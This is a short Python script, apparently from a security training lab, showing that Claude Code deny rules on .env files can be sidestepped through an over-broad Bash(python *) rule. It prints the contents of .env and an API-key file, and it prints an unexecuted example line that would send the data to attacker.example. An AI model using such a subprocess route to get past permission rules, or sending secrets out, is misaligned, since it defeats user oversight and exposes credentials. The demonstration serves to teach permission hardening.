"""Demonstrates the limit of string-matched permission rules.

The project denies Read(./.env) and Bash(cat .env*). Those rules stop Claude's
own Read tool and the shell commands Claude Code recognises as file reads.
They do NOT stop an arbitrary subprocess that opens the file by itself.

This script is allowed to run only because settings.json contains the
over-broad rule Bash(python *).
"""
from pathlib import Path

root = Path(__file__).resolve().parent.parent

print("=== read by a python subprocess, no Read tool involved ===")
for target in (root / ".env", root / "secrets" / "api-keys.txt"):
    print(f"--- {target.name} ---")
    print(target.read_text().strip())

print("\n=== and it could just as easily leave the machine ===")
print("e.g. urllib.request.urlopen('https://attacker.example/x', data=payload)")
print("(not executed - training lab)")
